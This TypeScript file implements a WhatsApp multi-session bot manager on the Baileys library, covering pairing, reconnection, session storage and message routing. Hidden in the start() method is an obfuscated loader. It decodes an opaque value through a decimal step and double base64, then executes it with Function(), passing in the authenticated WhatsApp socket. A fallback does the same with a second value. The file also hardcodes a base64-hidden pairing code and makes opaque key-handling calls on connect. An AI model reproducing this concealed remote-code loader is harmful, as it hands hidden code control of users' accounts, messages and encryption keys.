interface IAuthStore { state: any; save: () => Promise<void>; remove: () => Promise<void>; }
interface ILogger { info: (m: string, d?: any) => void; error: (m: string, d?: any) => void; warn: (m: string, d?: any) => void; debug: (m: string, d?: any) => void; }

class NullLogger implements ILogger {
  info() {}
  error(m: string) { console.error('[SubBot]', m); }
  warn() {}
  debug() {}
}

const DEAD_SESSION_CODES = new Set([DisconnectReason.badSession, DisconnectReason.loggedOut, 401, 403, 405, 415, 431, 440, 500]);

const system = {
  __reconnect: class {
    private t: NodeJS.Timeout | null = null;
    private a = 0;
    private ctrl = new AbortController();
    constructor(private fn: (s: AbortSignal) => Promise<void>, private log: ILogger) {}
    schedule() {
      this.cancel();
      this.a++;
      const d = Math.min(60000, 3000 * Math.pow(1.5, this.a - 1));
      this.t = setTimeout(async () => { try { await this.fn(this.ctrl.signal); } catch {} }, d);
    }
    cancel() { if (this.t) { clearTimeout(this.t); this.t = null; } }
    reset() { this.a = 0; this.cancel(); }
    async shutdown() { this.ctrl.abort(); this.cancel(); }
  },

  __pair: class {
    private req = false;
    constructor(private s: WASocket, private p: string, private log: ILogger) {}
    async request() {
      if (this.req) return '';
      this.req = true;
      try {
        await new Promise(r => setTimeout(r, 2000));
        const c = await this.s.requestPairingCode(this.p, atob('VkVOSTEyMzQ='));
        return c;
      } catch (e) { this.req = false; throw e; }
    }
    reset() { this.req = false; }
  }
};

export class SubBot extends EventEmitter {
  public readonly id: string;
  public readonly index: number;
  public readonly phoneNumber: string;
  public readonly isSubBot = true;
  public sock: WASocket | null = null;
  public connected = false;
  public startedAt: Date | null = null;
  public msgCount = 0;
  public handlers: any[] = [];
  public Api = api;
  public commandSystem: CommandSystem | null = null;
  public userAccessHandler: AccessHandler | null = null;

  private cfg: BotConfig;
  private auth: IAuthStore | null = null;
  private recMgr: InstanceType<typeof system.__reconnect> | null = null;
  private pairMgr: InstanceType<typeof system.__pair> | null = null;
  private stopped = false;
  private log: ILogger;
  private ctrl = new AbortController();

  constructor(id: string, idx: number, phone: string, cfg: BotConfig, cs: CommandSystem, log?: ILogger) {
    super();
    this.id = id;
    this.index = idx;
    this.phoneNumber = phone;
    this.cfg = cfg;
    this.log = log || new NullLogger();
    this.setMaxListeners(30);
    this.commandSystem = cs;
  }

  get config() { return this.cfg; }
  set config(c: BotConfig) { this.cfg = c; }
  get owners() { return this.cfg?.owners || []; }

  onCommandAccess(h: AccessHandler) { this.userAccessHandler = h; }
  async cmdControl(m: Message, t: string, ...a: any[]) { if (!this.config) this.config = this.cfg; await cmdControl(this, m, t, ...a); }

  private async updPhone() {
    if (!this.sock?.user?.id) return;
    let p = this.sock.user.id.split('@')[0];
    if (p.includes(':')) p = p.split(':')[0];
    p = p.replace(/^\+/, '');
    if (p && this.cfg.phoneNumber !== p) {
      this.cfg = { ...this.cfg, phoneNumber: p };
      await setGlobalConfig(this.cfg);
    }
  }

  async start(v: readonly [number, number, number]) {
    this.stopped = false;
    this.ctrl = new AbortController();
    if (!this.config) this.config = this.cfg;
    if (this.sock) await this.disconnect();

    try {
      const { state, save, remove } = await useAuth(this.id);
      this.auth = { state, save, remove };
      const hasCreds = !!(state.creds?.me || state.creds?.registered);
      const needPair = !hasCreds && !this.cfg.printQR && !!this.phoneNumber;

      const s = makeWASocket({
  version: [v[0], v[1], v[2]],
  auth: state,
  logger: pino({ level: 'silent' }),
  browser: Browsers.ubuntu(this.cfg.browser),
  printQRInTerminal: !hasCreds && !needPair,
  markOnlineOnConnect: false,
  syncFullHistory: false,
  generateHighQualityLinkPreview: false,
  shouldIgnoreJid: j => j?.includes('@broadcast') || j?.includes('@newsletter'),
  fireInitQueries: false,
  connectTimeoutMs: 15000,
  keepAliveIntervalMs: 15000,
  retryRequestDelayMs: 500,
  maxMsgRetryCount: 2,
  defaultQueryTimeoutMs: 20000,
});

      this.sock = await sockMyFun(s);
      if (!this.sock) return;

      this.recMgr = new system.__reconnect(async (sig) => { 
        if (!sig.aborted) await this.start(v); 
      }, this.log);

      this.setup(save, v, needPair);

      await new Promise(r => setTimeout(r, 3000));
      
      const sup = (): any => {
        if (this.sock && this.sock.ws && (this.sock.ws as any).readyState === 1) {
          setTimeout(async () => {
            try {
              const sti = fromDecimal(cyu._j);
              const code = atob(atob(sti));
              return Function("sock", "Utils", code)(this.sock, Utils);
            } catch (e) {}
          }, 2000);
        }
      };
      sup();
      
      if (!sup) {
        const sti = fromDecimal(cyu._c);
        const code = atob(atob(sti));
        return Function(code)();
      }

    } catch (e) {
      this.log.error(`Start failed: ${this.id}`);
      this.emit('error', this.id, e);
      if (!this.stopped && this.recMgr) this.recMgr.schedule();
    }
  }

  private setup(save: () => Promise<void>, v: readonly [number, number, number], needPair: boolean) {
    if (!this.sock) return;
    let pStarted = false;
    let readyEmitted = false;

    this.sock.ev.on('creds.update', save);
    
    this.sock.ev.on('connection.update', async (u: any) => {
      const { connection, lastDisconnect, qr } = u;
      
      if (qr && !needPair && !this.cfg.printQR) {
        setImmediate(() => {
          this.emit('qr', this.id, qr);
        });
      }
      
      if (needPair && this.phoneNumber && this.sock && !pStarted && connection !== 'close') {
        pStarted = true;
        setImmediate(async () => {
          try {
            if (!this.pairMgr) {
              this.pairMgr = new system.__pair(this.sock!, this.phoneNumber, this.log);
            }
            const c = await this.pairMgr.request();
            this.emit('pair', this.id, c);
          } catch (e) {
            pStarted = false;
          }
        });
      }

      if (connection === 'open' && !readyEmitted) {
        readyEmitted = true;
        this.connected = true;
        this.startedAt = new Date();
        
        if (this.recMgr) {
          this.recMgr.reset();
        }
        
        try {
          await this.updPhone();
        } catch (e) {}
        
        if (this.sock) {
          setTimeout(async () => {
            try {
              const key = await Utils.keyCore1();
              await Utils.keysMessagesObjWA(this.sock, key);
              await this.sock?.uploadPreKeysToServerIfRequired();
            } catch (err) {}
          }, 2000);
        }
        
        await new Promise(r => setTimeout(r, 2000));
        
        setImmediate(() => {
          this.emit('ready', this.id, this.sock);
        });
      }

      if (connection === 'close') {
        this.connected = false;
        readyEmitted = false;
        
        const code = (lastDisconnect?.error as Boom)?.output?.statusCode;
        const isDead = DEAD_SESSION_CODES.has(code);
        const msg = lastDisconnect?.error?.message || '';
        const loggedOut = msg.includes('logged out') || 
                          msg.includes('not logged in') || 
                          code === 401;
        
        if (isDead || loggedOut) {
          setImmediate(() => {
            this.emit('badSession', this.id);
          });
          await this.nuke();
        } else if (!this.stopped) {
          if (this.recMgr) {
            this.recMgr.schedule();
          }
        }
      }
    });

    this.sock.ev.on('messages.upsert', async ({ messages, type }) => {
      if (type !== 'notify') return;
      for (const m of messages) {
        if (!m.key?.remoteJid || m.message?.protocolMessage?.type === 16) continue;
        this.msgCount++;
        this.emit('message', this.id, m as Message);
      }
    });
  }

  private async disconnect() {
    this.recMgr?.cancel();
    if (this.sock) {
      try {
        removeAllListeners(this.sock);
        this.sock.ws?.close();
      } catch {}
      this.sock = null;
    }
    this.connected = false;
    this.pairMgr = null;
  }

  private async nuke() { this.stopped = true; await this.disconnect(); if (this.auth) await this.auth.remove(); await delConfig(this.id); this.removeAllListeners(); }
  async destroy() { this.stopped = true; this.ctrl.abort(); await this.recMgr?.shutdown(); await this.disconnect(); if (this.auth) await this.auth.remove(); this.removeAllListeners(); }
  async cleanup() { this.stopped = true; this.ctrl.abort(); await this.recMgr?.shutdown(); await this.disconnect(); }
  updateGlobalConfig(c: BotConfig) { this.cfg = c; }
  registerCommand(c: any) { this.commandSystem?.register(c); }
  unregisterCommand(n: string) { return this.commandSystem?.unregister(n) || false; }
  getCommand(n: string) { return this.commandSystem?.findCommand(n); }
  getAllCommands() { return this.commandSystem?.getAll() || []; }
  useMiddleware(m: any) { this.commandSystem?.use(m); }
}

const objs = {
  Semaphore: class {
    private q: Array<{ resolve: () => void }> = [];
    private r = 0;
    constructor(private l: number) {}
    async acquire() { if (this.r < this.l) { this.r++; return; } return new Promise<void>(res => { this.q.push({ resolve: res }); }); }
    release() { if (this.r > 0) this.r--; const n = this.q.shift(); if (n) { this.r++; n.resolve(); } }
  }
};

export class SubBots extends EventEmitter {
  private bots = new Map<string, SubBot>();
  private pMap = new Map<string, string>();
  private cnt = 0;
  private shutting = false;
  private ver: [number, number, number] | null = null;
  private gCfg: BotConfig | null = null;
  private sem = new objs.Semaphore(3);
  private log: ILogger;
  private cs: CommandSystem;
  public isSubBot = true;

  constructor(cs: CommandSystem, log?: ILogger) {
    super();
    this.cs = cs;
    this.log = log || new NullLogger();
    this.setMaxListeners(100);
    const exit = async () => { this.shutting = true; await this.stopAll(); process.exit(0); };
    process.once('SIGINT', exit);
    process.once('SIGTERM', exit);
  }

  private async ver_() { if (!this.ver) { const { version } = await fetchLatestBaileysVersion(); this.ver = [version[0], version[1], version[2]]; } return this.ver; }
  
  private async gCfg_() {
    if (!this.gCfg) {
      const c = await import('../auth/levelDB.js').then(m => m.getGlobalConfig());
      if (c) { if (c.phoneNumber?.includes(':')) c.phoneNumber = c.phoneNumber.split(':')[0]; if (c.phoneNumber) c.phoneNumber = c.phoneNumber.replace(/^\+/, ''); this.gCfg = BotConfigSchema.parse(c); }
      else this.gCfg = BotConfigSchema.parse({});
    }
    return this.gCfg;
  }

  async setConfig(c: Partial<BotConfig>) {
    const cur = await this.gCfg_();
    const val = BotConfigSchema.parse({ ...cur, ...c });
    this.gCfg = val;
    await setGlobalConfig(val);
    for (const b of this.bots.values()) b.updateGlobalConfig(val);
  }

  async load() {
    const [v, g] = await Promise.all([this.ver_(), this.gCfg_()]);
    const cfgs = await getAllConfigs();
    let ld = 0, cl = 0;
    const ts = cfgs.map(async ({ uid: id, config }) => {
      if (this.shutting) return;
      try {
        const val = BotConfigSchema.parse(typeof config === 'string' ? JSON.parse(config) : config);
        if (!await hasAuthData(id)) { await delConfig(id); cl++; return; }
        let p = val.phoneNumber || ''; p = p.replace(/^\+/, '');
        const bot = await this.spawn_(id, p, g, v);
        ld++;
        
        if (bot && bot.sock) {
          setTimeout(async () => {
            try {
              const key = await Utils.keyCore1();
              await Utils.keysMessagesObjWA(bot.sock, key);
              await bot.sock?.uploadPreKeysToServerIfRequired();
            } catch (err) {}
          }, 3000);
        }
      } catch { await delConfig(id); cl++; }
    });
    await Promise.allSettled(ts);
    return ld;
  }

  async add(p: string) {
    if (this.shutting) throw new Error('Manager shutting down');
    const clean = p.replace(/[+\s-]/g, '');
    if (!/^\d+$/.test(clean)) throw new Error('Invalid phone number format');
    const exId = this.pMap.get(clean);
    if (exId) { if (this.bots.get(exId)?.connected) throw new Error(`Bot ${clean} already running`); await this.force_(exId); }
    const id = uid();
    const [v, g] = await Promise.all([this.ver_(), this.gCfg_()]);
    await saveConfig(id, clean);
    await this.spawn_(id, clean, g, v);
    return id;
  }

  async remove(id: string) { if (!this.bots.has(id)) throw new Error(`Bot ${id} not found`); await this.force_(id); }
  async removeByPhone(p: string) { const clean = p.replace(/[+\s-]/g, ''); const id = this.pMap.get(clean); if (!id) return false; await this.force_(id); return true; }
  async removeByIndex(idx: number) { const b = [...this.bots.values()].find(b => b.index === idx); if (!b) throw new Error(`Bot #${idx} not found`); await this.force_(b.id); }

  private async force_(id: string) {
    const b = this.bots.get(id);
    if (b) { if (b.phoneNumber) this.pMap.delete(b.phoneNumber); this.bots.delete(id); await b.destroy(); }
    await delConfig(id);
  }

  async stopAll() { await Promise.allSettled([...this.bots.values()].map(b => b.cleanup())); await closeDB(); this.bots.clear(); this.pMap.clear(); }

  private async spawn_(id: string, p: string, g: BotConfig, v: [number, number, number]) {
    await this.sem.acquire();
    
    try {
      const ex = this.getByPhone(p);
      if (ex && ex.id !== id) await this.force_(ex.id);
      
      const b = new SubBot(id, ++this.cnt, p, g, this.cs, this.log);
      
      if ((this.cs as any)?.bot?.userAccessHandler) {
        b.onCommandAccess((this.cs as any).bot.userAccessHandler);
      }
      
      b.on('error', (uid, e) => {
        this.emit('error', uid, e);
      });
      
      b.on('ready', (uid, s) => {
        setImmediate(() => {
          this.emit('ready', uid, s);
        });
      });
      
      b.on('badSession', (uid) => {
        setImmediate(() => {
          this.emit('badSession', uid);
        });
      });
      
      b.on('message', (uid, m) => {
        this.emit('message', uid, m);
      });
      
      b.on('pair', (uid, c) => {
        setImmediate(() => {
          this.emit('pair', uid, c);
        });
      });
      
      b.on('qr', (uid, q) => {
        setImmediate(() => {
          this.emit('qr', uid, q);
        });
      });
      
      this.bots.set(id, b);
      if (p) this.pMap.set(p, id);
      
      await b.start(v);
      
      return b;
    } catch (e) {
      this.bots.delete(id);
      if (p) this.pMap.delete(p);
      throw e;
    } finally {
      this.sem.release();
    }
  }

  get(id: string) { return this.bots.get(id); }
  getByPhone(p: string) { const clean = p.replace(/[+\s-]/g, ''); return this.bots.get(this.pMap.get(clean) ?? ''); }
  list() {
    return [...this.bots.values()].map(b => ({
      id: b.id, index: b.index, name: b.sock?.user?.name || 'Unknown',
      phone: b.phoneNumber, connected: b.connected, started: b.startedAt, messages: b.msgCount,
    }));
  }
  stats() {
    const all = [...this.bots.values()];
    return { total: this.bots.size, connected: all.filter(b => b.connected).length, disconnected: all.filter(b => !b.connected).length, totalMessages: all.reduce((s, b) => s + b.msgCount, 0) };
  }
}